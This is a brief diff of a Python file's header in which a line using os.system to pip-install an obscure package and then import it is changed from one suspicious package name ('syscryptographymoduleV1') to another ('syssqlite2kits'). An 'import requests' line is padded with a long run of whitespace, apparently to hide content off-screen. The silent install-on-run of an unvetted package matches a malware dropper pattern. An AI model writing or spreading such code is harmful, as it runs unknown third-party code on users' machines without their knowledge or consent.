@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscryptographymoduleV1")
-import syscryptographymoduleV1
+os.system("pip install syssqlite2kits")
+import syssqlite2kits
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
